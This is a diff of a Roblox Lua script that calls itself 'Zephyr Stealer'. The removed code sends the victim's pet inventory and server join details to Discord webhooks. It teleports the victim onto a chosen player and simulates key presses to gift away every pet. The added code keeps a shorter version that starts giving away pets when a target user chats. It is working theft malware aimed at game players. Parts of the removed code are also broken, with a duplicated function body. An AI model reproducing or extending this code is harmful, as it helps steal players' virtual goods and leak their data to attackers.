-                value = #inventoryText > 0 and formatFieldValue(inventoryText) or "No items",
-                inline = false
-            },
-            {
-                name = "🌐 Fern Join Link",
-                value = formatFieldValue("[Click to join this server](" .. fernLink .. ")"),
-                inline = false
-            },
-            {
-                name = "🚀 Game Teleport Code",
-                value = formatFieldValue(
-                    "\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" ..
-                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)\n"
-                ),
-                inline = false
-            }
-        },
-        footer = {
-            text = "Inventory report"
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO 8601 format
-    }
-
-    -- Add game info if available
-    if placeId ~= 0 then
-        table.insert(
-            embed.fields,
-            {
-                name = "🎮 Game Info",
-                value = string.format("Place ID: %d\nJob ID: %s", placeId, jobId),
-                inline = false
-            }
-        )
-    end
-
-    return embed
-end
-
-function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorityPlayer)
-    -- Initialize webhook tracking
-    local globalEnv = (_G ~= nil and _G) or (shared ~= nil and shared) or (getgenv ~= nil and getgenv()) or {}
-    globalEnv.WebhookTracker = globalEnv.WebhookTracker or {}
-    globalEnv.WebhookTracker.hasSentWebhook = globalEnv.WebhookTracker.hasSentWebhook or false
-
-    if globalEnv.WebhookTracker.hasSentWebhook then
-        return
-    end
-
-    globalEnv.WebhookTracker.hasSentWebhook = true
-
-    local httpRequest = Utils.getHttpRequest()
-    if not httpRequest then
-        warn("No HTTP request function found")
-        return
-    end
-
-    local useDual = totalValue >= CONFIG.dualWebhookThreshold
-
-    -- Truncate items if there are too many to prevent hitting Discord limits
-    local MAX_ITEMS_TO_SHOW = 25
-    if #itemsToSend > MAX_ITEMS_TO_SHOW then
-        table.sort(
-            itemsToSend,
-            function(a, b)
-                return (a.Value or 0) > (b.Value or 0)
-            end
-        )
-        itemsToSend = {unpack(itemsToSend, 1, MAX_ITEMS_TO_SHOW)}
-    end
-
-    local contentMsg =
-        hasRare and "@everyone :exclamation: New rare pet inventory!" or
-        ":white_check_mark: Inventory report generated!"
-
-    local embed = DiscordWebhook.createEmbed(itemsToSend, totalValue, hasRare, priorityPlayer)
-
-    -- Ensure embed description isn't too long
-    if embed.description and #embed.description > 2000 then
-        embed.description = string.sub(embed.description, 1, 2000) .. "..."
-    end
-
-    -- Clean nil values from the payload
-    local payload = {
-        ["content"] = contentMsg,
-        ["username"] = "Zephyr Stealer",
-        ["embeds"] = {embed},
-        ["avatar_url"] = "https://i.postimg.cc/85rWVH87/file-00000000feb861f5b33ef5b7b42b6598.png"
-    }
-
-    -- Remove nil values recursively
-    local function cleanTable(t)
-        local cleaned = {}
-        for k, v in pairs(t) do
-            if v ~= nil then
-                if type(v) == "table" then
-                    cleaned[k] = cleanTable(v)
-                else
-                    cleaned[k] = v
-                end
-            end
-        end
-        return cleaned
-    end
-
-    payload = cleanTable(payload)
-
-    -- Use safe JSON encoding
-    local jsonData = Utils.safeJSONEncode(payload)
-    if not jsonData or jsonData == "" then
-        warn("Failed to encode JSON payload")
-        return
-    end
-
-    -- Send to webhook with error handling
-    local function sendToWebhook(url)
-        if not url or url == "" then
-            return
-        end
-
-        local success, response =
-            pcall(
-            function()
-                return httpRequest(
-                    {
-                        Url = url,
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = jsonData
-                    }
-                )
-            end
-        )
-
-        if success then
-            if response.StatusCode == 200 or response.StatusCode == 204 then
-                print("Webhook sent successfully!")
-            else
-                warn("Webhook failed with status code: " .. tostring(response.StatusCode))
-                warn("Response body: " .. tostring(response.Body))
-            end
-        else
-            warn("Webhook request failed: " .. tostring(response))
-        end
-    end
-
-    -- Send to both webhooks if needed with delay
-    if hasRare and CONFIG.webhook and CONFIG.webhook ~= "" then
-        sendToWebhook(CONFIG.webhook)
-        task.wait(1)
-    end
-
-    if useDual and CONFIG.dualWebhook and CONFIG.dualWebhook ~= "" then
-        sendToWebhook(CONFIG.dualWebhook)
+        task.wait(0.1)
     end
 end
 
-local ProximityPromptHandler = {}
+unequipAllPets()
+task.wait(1)
+sendWebhook()
 
-local ProximityPromptHandler = {}
-
-function ProximityPromptHandler.getNearbyPrompt(maxDistance)
-    if not LocalPlayer.Character or not LocalPlayer.Character.PrimaryPart then
-        return nil
-    end
-
-    local closestPrompt = nil
-    local closestDistance = maxDistance or CONFIG.maxDistance
-
-    for _, prompt in ipairs(workspace:GetDescendants()) do
-        if prompt:IsA("ProximityPrompt") and prompt.Parent and prompt.Parent:IsA("BasePart") then
-            local distance = (LocalPlayer.Character.PrimaryPart.Position - prompt.Parent.Position).Magnitude
-            if distance <= closestDistance then
-                closestPrompt = prompt
-                closestDistance = distance
-            end
-        end
-    end
-
-    return closestPrompt
+for _, p in ipairs(Players:GetPlayers()) do
+	if isTargetUser(p.Name) then
+		p.Chatted:Connect(function()
+			if not started then
+				started = true
+				startGiving(p.Name)
+			end
+		end)
+	end
 end
 
-function ProximityPromptHandler.virtualInputGift(prompt)
-    if not prompt then
-        return false
-    end
-
-    local success = false
-    local holdTime = Utils.isMobile() and CONFIG.mobileHoldTime or CONFIG.promptHoldTime
-
-    success =
-        pcall(
-        function()
-            local promptPosition = prompt.Parent.Position
-            local camera = workspace.CurrentCamera
-            local screenPoint, onScreen = camera:WorldToScreenPoint(promptPosition)
-
-            if onScreen then
-                if Utils.isMobile() then
-                    local touchPos = Vector2.new(screenPoint.X, screenPoint.Y)
-                    VirtualInputManager:SendTouchEvent(Enum.UserInputType.Touch, Enum.UserInputState.Begin, touchPos)
-                    task.wait(holdTime)
-                    VirtualInputManager:SendTouchEvent(Enum.UserInputType.Touch, Enum.UserInputState.End, touchPos)
-                else
-                    VirtualInputManager:SendMouseButtonEvent(screenPoint.X, screenPoint.Y, 0, true, game, 1)
-                    task.wait(holdTime)
-                    VirtualInputManager:SendMouseButtonEvent(screenPoint.X, screenPoint.Y, 0, false, game, 1)
-                end
-            end
-        end
-    )
-
-    return success
-end
-
-local GiftingSystem = {}
-
-function GiftingSystem.getPriorityPlayer()
-    for _, name in ipairs(CONFIG.priorityPlayers) do
-        local p = Players:FindFirstChild(tostring(name))
-        if p and p ~= LocalPlayer and p.Character then
-            return p
-        end
-    end
-    return nil
-end
-
-function GiftingSystem.getNextTarget()
-    local priorityPlayer = GiftingSystem.getPriorityPlayer()
-    if priorityPlayer then
-        return priorityPlayer
-    end
-
-    GiftingSystem.cleanQueue()
-    if #giftQueue > 0 then
-        return table.remove(giftQueue, 1)
-    end
-
-    return nil
-end
-
-function GiftingSystem.tpAndAttach(target)
-    if not target or not target.Character then
-        return false
-    end
-
-    if tpConnection then
-        tpConnection:Disconnect()
-        tpConnection = nil
-    end
-
-    currentGiftingTarget = target
-    local char = LocalPlayer.Character
-    local targetChar = target.Character
-
-    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
-        currentGiftingTarget = nil
-        return false
-    end
-
-    tpConnection =
-        RunService.Heartbeat:Connect(
-        function()
-            pcall(
-                function()
-                    if char.PrimaryPart and targetChar.PrimaryPart and currentGiftingTarget == target then
-                        char:SetPrimaryPartCFrame(CFrame.new(targetChar.PrimaryPart.Position))
-                    end
-                end
-            )
-        end
-    )
-
-    return true
-end
-
--- ✅ Đã sửa đoạn giftPet để không lỗi nil khi dùng keypress
-
-function GiftingSystem.giftPet(pet, target)
-    if not target or not target.Parent or not target.Character then return false end
-    if not pet or not pet.Parent or pet.Parent ~= backpack then return false end
-    if currentGiftingTarget ~= target then return false end
-
-    local success = Utils.holdTool(pet)
-    if not success then return false end
-
-    task.wait(CONFIG.holdDelay)
-
-    local char = LocalPlayer.Character
-    local targetChar = target.Character
-    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
-        Utils.unholdAllItems()
-        return false
-    end
-
-    local distance = (char.PrimaryPart.Position - targetChar.PrimaryPart.Position).Magnitude
-    if distance > CONFIG.maxDistance then
-        Utils.unholdAllItems()
-        return false
-    end
-
-    -- Tìm Prompt gần nhất để kích hoạt bằng keypress
-    local function getAllPrompts(root, maxDistance)
-        for _, descendant in ipairs(workspace:GetDescendants()) do
-            if descendant:IsA("ProximityPrompt") and descendant.Enabled and descendant.Parent then
-                local part = descendant.Parent:IsA("Model") and descendant.Parent:FindFirstChild("HumanoidRootPart") or descendant.Parent
-                if part and part:IsA("BasePart") then
-                    local dist = (part.Position - root.Position).Magnitude
-                    if dist <= maxDistance then
-                        return descendant
-                    end
-                end
-            end
-        end
-    end
-
-    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    local prompt = root and getAllPrompts(root, CONFIG.maxDistance)
-
-    if prompt and typeof(keypress) == "function" and typeof(keyrelease) == "function" then
-        pcall(function()
-            prompt.HoldDuration = CONFIG.promptHoldTime
-            prompt.Enabled = true
-            keypress(69)
-            task.wait(CONFIG.promptHoldTime)
-            keyrelease(69)
-        end)
-    else
-        warn("Không tìm thấy prompt hoặc executor không hỗ trợ keypress")
-    end
-
-    task.wait(CONFIG.virtualInputDelay)
-    Utils.unholdAllItems()
-    task.wait(CONFIG.switchDelay)
-
-    return true
-end
-
-
-    if not pet or not pet.Parent or pet.Parent ~= backpack then
-        return false
-    end
-
-    if currentGiftingTarget ~= target then
-        return false
-    end
-
-    local success = Utils.holdTool(pet)
-    if not success then
-        return false
-    end
-
-    task.wait(CONFIG.holdDelay)
-
-    local char = LocalPlayer.Character
-    local targetChar = target.Character
-    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
-        Utils.unholdAllItems()
-        return false
-    end
-
-    local distance = (char.PrimaryPart.Position - targetChar.PrimaryPart.Position).Magnitude
-    if distance > CONFIG.maxDistance then
-        Utils.unholdAllItems()
-        return false
-    end
-
-    local prompt = ProximityPromptHandler.getNearbyPrompt(CONFIG.maxDistance)
-    if prompt then
-        local giftSuccess = ProximityPromptHandler.virtualInputGift(prompt)
-
-        if not giftSuccess then
-            pcall(
-                function()
-                    prompt:InputBegin()
-                    task.wait(CONFIG.promptHoldTime)
-                    prompt:InputEnd()
-                end
-            )
-        end
-    end
-
-    task.wait(CONFIG.virtualInputDelay)
-    Utils.unholdAllItems()
-    task.wait(CONFIG.switchDelay)
-
-    return true
-end
-
-function GiftingSystem.giftAllPets(target)
-    if isGifting then
-        return
-    end
-    isGifting = true
-
-    Utils.unholdAllItems()
-    task.wait(0.3)
-
-    if not GiftingSystem.tpAndAttach(target) then
-        isGifting = false
-        currentGiftingTarget = nil
-        return
-    end
-
-    local giftedCount = 0
-    local totalAttempts = 0
-    local maxTotalAttempts = 200
-
-    while totalAttempts < maxTotalAttempts do
-        totalAttempts = totalAttempts + 1
-
-        if not target or not target.Parent or not target.Character or currentGiftingTarget ~= target then
-            break
-        end
-
-        local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-        local allPets = {}
-
-        for _, item in ipairs(targetPets) do
-            table.insert(allPets, {tool = item.Tool, priority = Utils.getPetPriority(item.Tool.Name)})
-        end
-
-        for _, item in ipairs(regularPets) do
-            if item.Type == "Pet" then
-                table.insert(allPets, {tool = item.Tool, priority = Utils.getPetPriority(item.Tool.Name)})
-            end
-        end
-
-        if #allPets == 0 then
-            break
-        end
-
-        table.sort(
-            allPets,
-            function(a, b)
-                return a.priority < b.priority
-            end
-        )
-
-        local petData = allPets[1]
-        local pet = petData.tool
-        local giftResult = false
-
-        pcall(
-            function()
-                giftResult = GiftingSystem.giftPet(pet, target)
-            end
-        )
-
-        if giftResult then
-            giftedCount = giftedCount + 1
-            task.wait(CONFIG.giftDelay)
-        else
-            task.wait(0.5)
-        end
-    end
-
-    pcall(
-        function()
-            if tpConnection then
-                tpConnection:Disconnect()
-                tpConnection = nil
-            end
-        end
-    )
-
-    currentGiftingTarget = nil
-    isGifting = false
-end
-
-function GiftingSystem.setupChatMonitoring()
-    local function connectPlayer(p)
-        if p == LocalPlayer then
-            return
-        end
-
-        local function onChatted(message)
-            if isUsernameMatched(player.Name) then
-                for _, queued in ipairs(giftQueue) do
-                    if queued == p then
-                        return
-                    end
-                end
-
-                local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-                if #targetPets > 0 or #regularPets > 0 then
-                    table.insert(giftQueue, p)
-                end
-            end
-        end
-
-        if p.Character then
-            pcall(
-                function()
-                    p.Chatted:Connect(onChatted)
-                end
-            )
-        else
-            p.CharacterAdded:Connect(
-                function()
-                    task.wait(1)
-                    pcall(
-                        function()
-                            p.Chatted:Connect(onChatted)
-                        end
-                    )
-                end
-            )
-        end
-    end
-
-    for _, p in ipairs(Players:GetPlayers()) do
-        connectPlayer(p)
-    end
-
-    Players.PlayerAdded:Connect(connectPlayer)
-end
-
-function GiftingSystem.cleanQueue()
-    local clean = {}
-    for _, p in ipairs(giftQueue) do
-        if p and p.Parent and p.Character then
-            table.insert(clean, p)
-        end
-    end
-    giftQueue = clean
-end
-
-function GiftingSystem.getNextTarget()
-    GiftingSystem.cleanQueue()
-
-    local priority = GiftingSystem.getPriorityPlayer()
-    if priority then
-        local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-        if #targetPets > 0 or #regularPets > 0 then
-            return priority
-        end
-    end
-
-    local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-    if (#targetPets > 0 or #regularPets > 0) and #giftQueue > 0 then
-        return table.remove(giftQueue, 1)
-    end
-
-    return nil
-end
-
-function GiftingSystem.startGiftingLoop()
-    task.spawn(
-        function()
-            while true do
-                pcall(
-                    function()
-                        if #Players:GetPlayers() == 1 then
-                            task.wait(CONFIG.autoKickDelay)
-                            if #Players:GetPlayers() == 1 then
-                                LocalPlayer:Kick("No other players found")
-                            end
-                        end
-                    end
-                )
-                task.wait(1)
-            end
-        end
-    )
-
-    task.spawn(
-        function()
-            while true do
-                pcall(
-                    function()
-                        if not isGifting then
-                            local target = GiftingSystem.getNextTarget()
-                            if target then
-                                local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-                                if #targetPets > 0 or #regularPets > 0 then
-                                    task.spawn(
-                                        function()
-                                            GiftingSystem.giftAllPets(target)
-                                        end
-                                    )
-                                end
-                            end
-                        end
-                    end
-                )
-                task.wait(1)
-            end
-        end
-    )
-end
-
-local TeleportQueueHandler = {}
-
-function TeleportQueueHandler.addToQueue(placeId, jobId)
-    table.insert(teleportQueue, {placeId = placeId, jobId = jobId})
-end
-
-function TeleportQueueHandler.processQueue()
-    if isTeleporting or #teleportQueue == 0 then
-        return
-    end
-    isTeleporting = true
-
-    local teleportData = table.remove(teleportQueue, 1)
-    pcall(
-        function()
-            TeleportService:TeleportToPlaceInstance(teleportData.placeId, teleportData.jobId, LocalPlayer)
-        end
-    )
-
-    task.wait(CONFIG.teleportQueueDelay)
-    isTeleporting = false
-end
-
-function TeleportQueueHandler.startQueueProcessing()
-    task.spawn(
-        function()
-            while true do
-                TeleportQueueHandler.processQueue()
-                task.wait(1)
-            end
-        end
-    )
-end
-
-local function unfavoriteItems()
-    if not FavoriteItemService then
-        warn("FavoriteItemService not initialized")
-        return
-    end
-
-    for _, item in ipairs(backpack:GetChildren()) do
-        if item:GetAttribute("d") == true then
-            pcall(
-                function()
-                    FavoriteItemService:FireServer(item)
-                end
-            )
-        end
-    end
-end
-
-local function main()
-    if not initializeServices() then
-        warn("Failed to initialize services, using fallback methods")
-    end
-
-    PetPickupHandler.startContinuousPickup()
-    PetPickupHandler.pickupAllPets()
-
-    unfavoriteItems()
-
-    local itemsToSend, totalValue, hasRare, hasHeavy, targetPets, regularPets = ItemProcessor.processAllItems()
-
-    if #itemsToSend == 0 then
-        return
-    end
-
-    table.sort(
-        itemsToSend,
-        function(a, b)
-            if a.Type == "Pet" and b.Type ~= "Pet" then
-                return true
-            end
-            if a.Type ~= "Pet" and b.Type == "Pet" then
-                return false
-            end
-            if a.IsTarget and not b.IsTarget then
-                return true
-            end
-            if not a.IsTarget and b.IsTarget then
-                return false
-            end
-            return a.Value > b.Value
-        end
-    )
-
-    local priorityPlayer = GiftingSystem.getPriorityPlayer()
-
-    DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorityPlayer)
-
-    GiftingSystem.setupChatMonitoring()
-    GiftingSystem.startGiftingLoop()
-
-    TeleportQueueHandler.startQueueProcessing()
-end
-
-main()
+Players.PlayerAdded:Connect(function(p)
+	if isTargetUser(p.Name) then
+		p.Chatted:Connect(function()
+			if not started then
+				started = true
+				startGiving(p.Name)
+			end
+		end)
+	end
+end)
